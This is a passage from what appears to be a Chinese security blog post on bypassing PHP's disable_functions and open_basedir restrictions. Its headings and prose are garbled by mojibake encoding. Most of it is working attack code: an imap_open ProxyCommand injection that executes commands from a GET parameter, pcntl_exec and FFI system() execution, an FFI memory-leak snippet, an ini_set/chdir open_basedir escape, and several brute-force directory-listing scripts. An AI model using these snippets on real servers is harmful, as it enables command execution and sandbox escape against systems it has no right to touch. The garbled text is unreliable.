<h3 id="åˆ©ç”¨è„šæœ¬-æœªæµ‹è¯•"><a href="#åˆ©ç”¨è„šæœ¬-æœªæµ‹è¯•" class="headerlink" title="åˆ©ç”¨è„šæœ¬(æœªæµ‹è¯•)"></a>åˆ©ç”¨è„šæœ¬(æœªæµ‹è¯•)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echo\t&quot;</span> . base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64\t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] . &quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;;</span></span><br><span class="line">imap_open(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>); <span class="comment">// or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡"><a href="#åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡" class="headerlink" title="åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡"></a>åˆ©ç”¨pcntlæ’ä»¶ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</span><br></pre></td></tr></table></figure>



<h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><p>FFI::load æ— è§† opeb_basedir å¯ä»¥ç›´æ¥åŠ è½½æ–‡ä»¶</p>
<p>FFI ç›¸å¯¹äº php æ›´åŠ åº•å±‚ï¼Œå¯ä»¥æ³„éœ²å†…å­˜</p>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;sleep 5&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="open-basedirï¼Œç¦ç”¨FFI-cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ"><a href="#open-basedirï¼Œç¦ç”¨FFI-cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="open_basedirï¼Œç¦ç”¨FFI::cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ"></a>open_basedirï¼Œç¦ç”¨FFI::cdefï¼Œç›®å½•æ— æ³•å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$value=&lt;&lt;&lt;EOF</span><br><span class="line">#define FFI_SCOPE &quot;DUMMY&quot;</span><br><span class="line">#define FFI_LIB &quot;libc.so.6&quot;</span><br><span class="line"> </span><br><span class="line">int system(const char *command);</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$tmpHandle = tmpfile();</span><br><span class="line">$metaDatas = stream_get_meta_data($tmpHandle);</span><br><span class="line">$tmpFilename = $metaDatas[&#x27;uri&#x27;];</span><br><span class="line">fwrite($tmpHandle, $value);</span><br><span class="line">fseek($tmpHandle, 0);</span><br><span class="line">echo fread($tmpHandle, 1024);</span><br><span class="line">var_dump($tmpFilename);</span><br><span class="line">fflush($tmpHandle );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ffi=FFI::load($tmpFilename);</span><br><span class="line">$ffi-&gt;system(&#x27;echo bypass_disable_function &gt; /tmp/testing&#x27;);</span><br><span class="line"></span><br><span class="line">fclose($tmpHandle);</span><br></pre></td></tr></table></figure>



<h3 id="å†…å­˜æ³„éœ²"><a href="#å†…å­˜æ³„éœ²" class="headerlink" title="å†…å­˜æ³„éœ²"></a>å†…å­˜æ³„éœ²</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=FFI::load(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=FFI::cast(<span class="string">&quot;void *&quot;</span>,FFI::new(<span class="string">&quot;int[1]&quot;</span>,<span class="literal">false</span>));</span><br><span class="line"><span class="variable">$a</span>=FFI::string(<span class="variable">$b</span>-<span class="number">400000</span>,<span class="number">400000</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p>
<h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p>
<h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">&quot;win32std&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;win32std extension required!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="æ¨èç½‘å€"><a href="#æ¨èç½‘å€" class="headerlink" title="æ¨èç½‘å€"></a>æ¨èç½‘å€</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745#h3-5">https://www.anquanke.com/post/id/197745#h3-5</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95">æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³•</a> </p>
<h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfileç»•è¿‡open-basediråœ¨-tmpç›®å½•å†™æ–‡ä»¶"><a href="#tmpfileç»•è¿‡open-basediråœ¨-tmpç›®å½•å†™æ–‡ä»¶" class="headerlink" title="tmpfileç»•è¿‡open_basediråœ¨/tmpç›®å½•å†™æ–‡ä»¶"></a>tmpfileç»•è¿‡open_basediråœ¨/tmpç›®å½•å†™æ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$value=&lt;&lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$tmpHandle = tmpfile();</span><br><span class="line">$metaDatas = stream_get_meta_data($tmpHandle);</span><br><span class="line">$tmpFilename = $metaDatas[&#x27;uri&#x27;];</span><br><span class="line">fwrite($tmpHandle, $value);</span><br><span class="line">fseek($tmpHandle, 0);</span><br><span class="line">echo fread($tmpHandle, 1024);</span><br><span class="line">var_dump($tmpFilename);</span><br><span class="line">fflush($tmpHandle );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fclose($tmpHandle);</span><br></pre></td></tr></table></figure>







<h2 id="ini-setä¸chdir-ç»•è¿‡open-basedir"><a href="#ini-setä¸chdir-ç»•è¿‡open-basedir" class="headerlink" title="ini_setä¸chdir ç»•è¿‡open_basedir"></a>ini_setä¸chdir ç»•è¿‡open_basedir</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="globåè®®åˆ—æ ¹ç›®å½•"><a href="#globåè®®åˆ—æ ¹ç›®å½•" class="headerlink" title="globåè®®åˆ—æ ¹ç›®å½•"></a>globåè®®åˆ—æ ¹ç›®å½•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="realpathåˆ—ç›®å½•"><a href="#realpathåˆ—ç›®å½•" class="headerlink" title="realpathåˆ—ç›®å½•"></a>realpathåˆ—ç›®å½•</h2><p>realpathæ˜¯phpä¸­ä¸€ä¸ªå°†ç›¸å¯¹è·¯å¾„è½¬åŒ–ä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œè€Œå¦‚æœå¼€å¯äº†<code>open_basedir</code>çš„è¯ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œä¼šè¿”å›falseï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨<code>open_basedir</code>é‡Œçš„æ–‡ä»¶çš„è¯ï¼Œä»–å°±ä¼šè¿”å›<code>file is not within the allowed path(s)</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç±»ä¼¼äºæŠ¥é”™ç›²æ³¨å»çˆ†å‡ºæ–‡ä»¶åäº†<br>è¿™é‡Œæœ‰ä¸ªå°trickï¼Œåˆ©ç”¨windowsä¸‹çš„é€šé…ç¬¦&lt;å’Œ&gt;å»è¿›è¡Œçˆ†ç ´å¯ä»¥å¿«ä¸€ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexist&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span>.<span class="variable">$chars</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;&lt;&#x27;</span>;</span><br><span class="line">    realpath(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexist</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$regex</span> = <span class="string">&#x27;/File\((.*)\) is not within/&#x27;</span>;</span><br><span class="line">    printf(<span class="string">&quot;errstr: %s &lt;br/&gt;&quot;</span>,<span class="variable">$errstr</span>);</span><br><span class="line">    preg_match(<span class="variable">$regex</span>, <span class="variable">$errstr</span>, <span class="variable">$mathes</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$mathes</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        printf(<span class="string">&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;</span>, <span class="variable">$mathes</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SplFileInfo-getRealPathåˆ—ç›®å½•"><a href="#SplFileInfo-getRealPathåˆ—ç›®å½•" class="headerlink" title="SplFileInfo::getRealPathåˆ—ç›®å½•"></a>SplFileInfo::getRealPathåˆ—ç›®å½•</h2><p> SplFileInfoç±»æ˜¯ä¸€ä¸ªç”¨æ¥ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›é«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œè¿™ä¸ªç±»å¯ä»¥è¿›è¡Œå¾ˆå¤šæ–‡ä»¶çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±æœ‰ä¸€ä¸ªæ–¹æ³•å’Œä¹‹å‰çš„<code>realpath</code>å¾ˆç›¸ä¼¼ï¼Œå°±æ˜¯<code>getRealPath</code>ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨è·å–æ–‡ä»¶è·¯å¾„çš„æ—¶å€™ï¼Œå¦‚æœå­˜å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›falseï¼Œå¦åˆ™è¿”å›ç»å¯¹è·¯å¾„ï¼Œè€Œä¸”ä»–è¿˜ç›´æ¥å¿½ç•¥äº†<code>open_basedir</code>çš„è®¾å®š </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$basedir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&lt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;getRealPath();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$re</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•"><a href="#GDåº“imageftbbox-imagefttextåˆ—ä¸¾ç›®å½•" class="headerlink" title="GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•"></a>GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span></span><br><span class="line">    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span></span><br><span class="line">    imageftbbox(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        printf(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"><a href="#bindtextdomainæš´åŠ›çŒœè§£ç›®å½•" class="headerlink" title="bindtextdomainæš´åŠ›çŒœè§£ç›®å½•"></a>bindtextdomainæš´åŠ›çŒœè§£ç›®å½•</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p>
<p> å¦‚ä¸Šå›¾ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°<code>$directory</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ã€‚å®ƒä¼šåœ¨<code>$directory</code>å­˜åœ¨çš„æ—¶å€™è¿”å›<code>$directory</code>ï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚ </p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/06/29/bypass_disable_function_open_basedir/" data-id="ckw7zp3yt003lftn7brp70gkp" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">æ‚</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">æ¼æ´æŒ–æ˜</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">ç¼–ç¨‹</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">å†…ç½‘æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">å‡ºé¢˜ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">åŸŸæ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">å¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">å­¦ä¹ ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">å°å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">æ‚</a></li><li class="tag-list-item"><a class="tag-list-link" 